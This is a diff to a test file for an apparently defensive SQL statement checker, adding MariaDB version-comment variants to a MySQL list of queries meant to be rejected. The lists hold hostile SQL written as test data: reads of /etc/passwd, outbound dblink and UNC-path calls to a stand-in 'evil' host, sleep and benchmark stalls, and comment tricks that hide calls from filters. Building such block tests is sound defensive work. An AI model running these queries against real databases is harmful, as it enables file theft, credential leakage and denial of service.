@@ -26,7 +26,7 @@ describe('statement check (Oracle, Snowflake, BigQuery)', () => {
       postgres: ["select dblink('host=evil', 'select 1')", "select lo_import('/etc/passwd')", "select pg_read_file('/etc/passwd')", 'select "lo_import"(\'/x\')',
         "select pg_catalog.pg_read_file('/x')", "select * from dblink('h', 'q') as (a int)", "select my_schema.evil(1)", "select evil(1)", 'select pg_sleep(10)',
         "select query_to_xml('select 1', true, true, '')", "select * from pg_ls_dir('.')"],
-      mysql: ["select load_file('/etc/passwd')", "select /*!50000 sleep(10) */ 1", "select /*+ MAX_EXECUTION_TIME(100000) */ 1", "select a from t into outfile '/tmp/x'",
+      mysql: ["select load_file('/etc/passwd')", "select /*!50000 sleep(10) */ 1", "select /*M!100000 sleep(10) */ 1", "select /*m! sleep(10) */ 1", "select /*+ MAX_EXECUTION_TIME(100000) */ 1", "select a from t into outfile '/tmp/x'",
         'select sleep(10)', "select benchmark(1e9, md5('x'))", 'select `load_file`(\'/x\')'],
       mssql: ["select * from sys.fn_xe_file_target_read_file('\\\\evil\\x\\*.xel', null, null, null)", "select * from fn_get_audit_file('\\\\evil\\a', default, default)",
         "select * from [xp_dirtree]('\\\\evil\\s')", "select * from openrowset(bulk 'c:\\x', single_clob) as x", "select * from opendatasource('SQLNCLI', 'Data Source=evil').db.dbo.t",
